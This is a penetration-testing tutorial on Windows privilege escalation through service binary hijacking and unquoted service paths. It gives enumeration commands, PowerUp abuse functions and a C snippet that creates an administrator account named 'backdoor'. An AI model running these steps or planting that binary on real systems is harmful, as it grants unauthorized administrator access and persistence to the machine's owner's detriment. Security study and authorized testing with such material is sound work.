# Services Hijacking

## Service Binary Hijacking - Manually

Each Windows service has an associated binary file. These binary files are executed when the service is started or transitioned into a running state. As a result, a lower-privileged user could replace the program with a malicious one.&#x20;

To execute the replaced binary, the user can restart the service or, in case the service is configured to start automatically, reboot the machine. Once the service is restarted, the malicious binary will be executed with the privileges of the service, such as LocalSystem.

To get a list of all installed Windows services: `Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`

To get the permissions of a specific binary: `icacls "C:\xampp\apache\bin\httpd.exe"`

We typically want to have the `Full Access (F)` permission, allowing us to write to and modify the binary and therefore, replace it. The permission must be set to our users, everyone, or similar.

If you have full access or write permissions, you can replace the service binary and then use

`net stop servicename` followed by `net start servicename`

if that doesn't work, check the start mode of the service using:\
`Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}`

if it is set to`Auto` then you will need to restart the computer using: `shutdown /r /t 0`

{% hint style="warning" %}
Notice that using  `net stop servicename` followed by `net start servicename`\
will most probably print an error message after the start command, even if the exploitation was successful. \
\
The reason is that, basically, the start command starts the hijacked binary, meaning that its code will be executed rather than the original service's code, which is why the service effectively fails to start.
{% endhint %}

***

### Service Binary Hijacking - Using PowerUp

After we import `PowerUp.ps1`, we can use `Get-ModifiableServiceFile`.\
This function displays services the current user can modify, such as the service binary or configuration files.

PowerUp also provides us an `AbuseFunction`, which is a built-in function to replace the binary and, if we have sufficient permissions, restart it. The default behaviour is to create a new local user called `john` with the password `Password123!` and add it to the local `Administrators` group.&#x20;

* To check the service related to a specific binary:
  * `Import-Module .\PowerUp.ps1`
  * `echo 'C:\xampp\mysql\bin\mysqld.exe' | Get-ModifiablePath -Litera`
* Invoke all PowerUp checks:
  * `Import-Module .\PowerUp.ps1`
  * `Invoke-AllChecks`
* Invoke the AbuseFunction on a specific service binary:
  * `Import-Module .\PowerUp.ps1`
  * `Invoke-ServiceAbuse -Name 'ServiceName'`

***

### C code snippet to replace the vulnerable executable

{% hint style="success" %}
You can use and compile the following C code snippet to replace vulnerable service binaries.
{% endhint %}

```

#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user backdoor backdoor123 /add");
  i = system ("net localgroup administrators backdoor /add");
  
  return 0;
}

//compile on kali using x86_64-w64-mingw32-gcc adduser.c -o binaryfilename.exe

```

***

## Unquoted Service Paths

When a service is installed, the registry configuration specifies a path to the binary that should be executed on service start. If the binary is `not encapsulated within quotes`, Windows will attempt to locate the binary in **different folders**.

For example, is the service binary path is\
`C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe`

Then Windows will attempt to run the following executables:

* `C:\Program.exe\`
* `C:\Program Files (x86)\System.exe`
* and so on...

In these cases, you can put a malicious executable in these directories to escalate privileges

***

### Enumeration & Exploitation

Using wmic:

* `wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """`

Using PowerUp.ps1:

* `Import-Module .\PowerUp.ps1`
* `Get-UnquotedService`

In order to exploit and subvert the original unquoted service call, we must create a malicious executable, place it in a directory that corresponds to one of the interpreted paths, and match its name to the interpreted filename.

Then, once the service is started, our file gets executed with the same privileges that the service starts with. Often, this happens to be the LocalSystem account, which results in a successful privilege escalation attack.

Supposing you have found the following unquoted service path:\
`C:\Program Files\My Program\My service\service.exe`

Use `icacls c:\`, then `C:\Program Files\` and so on until you have `(W) permissions on a folder` then `copy the malicious file with the target binary's name` and restart the service using `Stop-Service ServiceName`and `Start-Service ServiceName`

You can also that automatically using `PowerUp.ps1`:

1. `Import-Module .\PowerUp.ps1`
2. `Write-ServiceBinary -Name 'ServiceName' -Path "C:\path\to\example.exe"`
3. `Restart-Service ServiceName`
